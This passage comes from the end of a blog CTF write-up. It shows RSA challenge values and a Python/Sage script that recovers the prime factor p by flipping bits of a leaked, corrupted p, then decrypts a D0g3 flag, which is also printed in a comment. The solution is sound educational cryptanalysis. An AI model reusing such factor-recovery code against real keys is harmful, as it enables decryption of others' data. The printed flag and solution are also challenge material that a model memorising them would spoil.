1100010100001010101110100101000111110111111100000100110011111111100001100010011011101100111010111011111111010000111100001011100000011011011101001010110000110000100011111010001000100110110101011011011101101001010100100011111011100011001010001011110010001011100100111110101010100001111001110010100011111111011010101001011001110100101010101110011010010011010001011001000101110110111101100000000111010000001101101000110010101011101100011011010100000111110011100000101100011001011010101010011010000110000100101010000111010000010000111101011101001110000100001011001000101111111010001111101100111100001111010111000111110000000100101101011100110100010010100110010110111110010101110100100110110111111101101001101001111111000001010010111101011100010001110100001100111100100101000011000010010101110011000001011000100111010001101011010001010001010100010000111100101011010011001001001001010001011111&quot;</span></span><br><span class="line">c = <span class="number">648659996883132958452475257796602613189879301487847405216471007121754749951298363233382180834913540764092786940057181080927355660460381395088372867913133735422392932952816604006704596327756935266986129910479506882505907904430233867679401421389953487086323164592136087279311125475047621905660123041626641630706061455304484397649405719759701653263864099184519170798389332085634207142922924038004431413134417655421711267137466093925090771713675539684916815370659619667380263644049047570344389362078129275437500570867974487770126973576722227465911421045974648213121152349083537361858857544102306973073891054803979730900133866130735788843220808943585448708741360225554842674800182282366156481974607480354344220723046812041982611668819405365830996211113516599832094310331887381328384247128254312242553157020432406205341981825116709024907807007331879710521475430927336325457264858100630743549523016981915086692403518518503721357940446862979918199049818595067530898875283476919541114287403472219721543779069906990917468926318716181543045853690891928785246098935450012073748844379428654539945552703394936794097508533965691992172631173810815273012001322704980308031015641924064797723100484379884550646204521617243857947530611802152697501529860</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">attack</span>(<span class="params">n, p, c</span>):</span><br><span class="line">    p1 = p[:<span class="number">1024</span>]</span><br><span class="line">    p2 = p[<span class="number">1024</span>:]</span><br><span class="line">    ch = [i <span class="keyword">for</span> i, c <span class="keyword">in</span> <span class="built_in">enumerate</span>(p1) <span class="keyword">if</span> c == <span class="string">&#x27;0&#x27;</span>]</span><br><span class="line">    ch1 = [k <span class="keyword">for</span> k, c <span class="keyword">in</span> <span class="built_in">enumerate</span>(p1) <span class="keyword">if</span> c == <span class="string">&#x27;1&#x27;</span>]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> ch:</span><br><span class="line">        <span class="keyword">if</span> i == <span class="number">1023</span>:</span><br><span class="line">            pp1 = p1[:<span class="number">1023</span>] + <span class="string">&quot;1&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            pp1 = p1[:i] + <span class="string">&quot;1&quot;</span> + p1[i+<span class="number">1</span>:]</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> ch1:</span><br><span class="line">            <span class="keyword">if</span> j == <span class="number">0</span>:</span><br><span class="line">                pp2 = <span class="string">&quot;0&quot;</span>+ p2[<span class="number">1</span>:]</span><br><span class="line">            <span class="keyword">if</span> j == <span class="number">1023</span>:</span><br><span class="line">                pp2 = p2[:<span class="number">1023</span>] + <span class="string">&quot;0&quot;</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                pp2 = p2[:j] + <span class="string">&quot;0&quot;</span> + p2[j+<span class="number">1</span>:]</span><br><span class="line">            p = Integer(<span class="built_in">int</span>(pp1+pp2, <span class="number">2</span>))</span><br><span class="line">            <span class="comment">#print(n % p)</span></span><br><span class="line">            <span class="keyword">if</span> n % p == <span class="number">0</span>:</span><br><span class="line">                <span class="comment"># print(i, j)</span></span><br><span class="line">                q = n // p</span><br><span class="line">                d = invert(<span class="number">65537</span>, (p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line">                m = long_to_bytes(<span class="built_in">int</span>(<span class="built_in">pow</span>(c,d,n)))</span><br><span class="line">                <span class="keyword">if</span> <span class="string">b&#x27;D0g3&#x27;</span> <span class="keyword">in</span> m:</span><br><span class="line">                    <span class="built_in">print</span>(m)</span><br><span class="line">                    <span class="keyword">return</span></span><br><span class="line">attack(n, p, c)</span><br><span class="line"><span class="comment"># b&#x27;D0g3&#123;sYuWzkFk12A1gcWxG9pymFcjJL7CqN4Cq8PAIACObJ&#125;&#x27;</span></span><br></pre></td></tr></table></figure>


    </div>

    
    <div class="about">
        <h1>About this Post</h1>
        <div class="details">
            <p>This post is written by Boogipop, licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc/4.0">CC BY-NC 4.0</a>.</p>
        </div>
        
        <p class="tags">
            
            <i class="icon"></i>
            <a href="/tags/WriteUp/" class="tag">#WriteUp</a>
        </p>
        
    </div>
    

    <div class="container post-prev-next">
        
        <a href="/2023/12/28/NCTF%202023%20Web%20Writeup(Post-Match)/" class="next">
            <div>
                <div class="text">
                    <p class="label">Next</p>
                    <h3 class="title">NCTF 2023 Web Writeup(Post-Match)</h3>
                </div>
            </div>
        </a>
        
        
        <a href="/2023/12/21/fragmented%20memories%20Recording/" class="prev">
            <div>
                <div class="text">
                    <p class="label">Previous</p>
                    <h3 class="title">fragmented memories Recording</>
                </div>
            </div>
        </a>
        
    </div>

    
        
        
        <script src="https://giscus.app/client.js" data-repo="Boogipop/Boogipop.github.io" data-repo-id="R_kgDOIFi78g" data-category="Announcements" data-category-id="DIC_kwDOIFi78s4Cav9f" data-mapping="pathname" data-strict="1" data-reactions-enabled="1" data-emit-metadata="0" data-input-position="top" data-theme="preferred_color_scheme" data-lang="zh-CN" crossorigin="anonymous" async></script>
        
    
</article>

        <footer>
    <div class="inner">
        <div class="links">
            
            <div class="group">
                <h2 class="title">Blog</h2>
                
                <a href="/" class="item">Blog</a>
                
                <a href="/archives" class="item">Archives</a>
                
                <a href="/tags" class="item">Tags</a>
                
                <a href="/categories" class="item">Categories</a>
                
                <a href="/search" class="item">Search</a>
                
                <a href="/friends" class="item">Friends</a>
                
                <a href="/about" class="item">About</a>
                
                <a href="/atom.xml" class="item">RSS</a>
                
            </div>
            
            <div class="group">
                <h2 class="title">Projects</h2>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/rsa-cli" class="item">RSA CLI</a>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/hexo-theme-cupertino" class="item">Hexo Theme Cupertino</a>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/a-calendar" class="item">A Calendar</a>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/auto-mirroring-bucket" class="item">Auto Mirroring Bucket</a>
                
            </div>
            
            <div class="group">
                <h2 class="title">Me</h2>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom" class="item">GitHub</a>
                
                <a target="_blank" rel="noopener" href="https://codepen.io/mrwillcom" class="item">CodePen</a>
                
                <a target="_blank" rel="noopener" href="https://www.patreon.com/MrWillCom" class="item">Patreon</a>
                
                <a target="_blank" rel="noopener" href="https://noc.social/@MrWillCom" class="item">Mastodon</a>
                
                <a target="_blank" rel="noopener" href="https://discord.gg/UKuFDjcfY8" class="item">Discord</a>
                
                <a href="mailto:mr.will.com@outlook.com" class="item">Email</a>
                
            </div>
            
        </div>
        <span>&copy; 2024 Boogipop<br>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> </span>
        
        
            <br>
            <div class="color-scheme-toggle" role="radiogroup" id="theme-color-scheme-toggle">
                <label>
                    <input type="radio" value="light">
                    <span>Light</span>
                </label>
                <label>
                    <input type="radio" value="dark">
                    <span>Dark</span>
                </label>
                <label>
                    <input type="radio" value="auto">
                    <span>Auto</span>
                </label>
            </div>
        
    </div>
</footer>


        
<script src="/js/main.js"></script>

        
        
        

        
        <script src="https://unpkg.com/scrollreveal"></script>
		
        <script>
            window.addEventListener('load', () => {
                ScrollReveal({ delay: 250, reset: true, easing: 'cubic-bezier(0, 0, 0, 1)' })
                ScrollReveal().reveal('.post-list-item .cover-img img')
                ScrollReveal().reveal('.post-list-item, .card, .content p img, .content .block-large img', { distance: '60px', origin: 'bottom', duration: 800 })
            })
        </script>
        
    </body>
</html>